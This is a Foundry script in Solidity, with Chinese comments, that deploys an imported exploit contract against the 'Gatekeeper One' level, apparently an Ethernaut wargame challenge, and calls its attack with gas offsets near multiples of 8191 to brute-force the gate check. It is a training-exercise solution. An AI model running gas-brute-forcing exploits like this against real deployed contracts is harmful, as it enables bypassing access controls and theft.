// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import {GatekeeperOneExploit} from "../src/GatekeeperOneExploit.sol";

contract GatekeeperOneAttackScript is Script {
    function run() external {
        address gatekeeperLevel = 0x1bf4EF12f0A2138cF7566AA477B5A8c4823e69EA;

        vm.startBroadcast();

        GatekeeperOneExploit exploit = new GatekeeperOneExploit(gatekeeperLevel);

        // baseGas 取 8191 的整数倍附近，range 给 8191 足够覆盖一个完整周期
        // 如果一次没碰中，可以把 baseGas 改成 8191*4 / 8191*5 等再跑
        exploit.attack(8191 * 3, 8191);

        vm.stopBroadcast();
    }
}
